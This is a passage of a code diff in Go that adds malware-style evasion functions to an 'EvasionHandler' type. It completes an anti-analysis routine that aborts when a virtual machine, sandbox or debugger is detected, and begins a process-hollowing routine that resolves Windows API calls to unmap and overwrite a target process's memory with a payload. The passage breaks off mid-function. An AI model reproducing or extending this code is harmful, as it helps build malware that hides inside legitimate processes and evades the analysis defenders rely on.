@@ -118,3 +118,33 @@ func (e *EvasionHandler) CheckDebugger() bool {
 func (e *EvasionHandler) AntiAnalysis() error {
 	if e.CheckVM() {
 		return fmt.Errorf("VM detected")
+	}
+
+	if e.CheckSandbox() {
+		return fmt.Errorf("sandbox detected")
+	}
+
+	if e.CheckDebugger() {
+		return fmt.Errorf("debugger detected")
+	}
+
+	return nil
+}
+
+func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("process hollowing is Windows only")
+	}
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+
+	createProcess := kernel32.NewProc("CreateProcessW")
+	unmapView := ntdll.NewProc("NtUnmapViewOfSection")
+	writeMem := kernel32.NewProc("WriteProcessMemory")
+	resumeThread := kernel32.NewProc("ResumeThread")
+
+	var si syscall.StartupInfo
+	var pi syscall.ProcessInformation
+	si.Cb = uint32(unsafe.Sizeof(si))
+
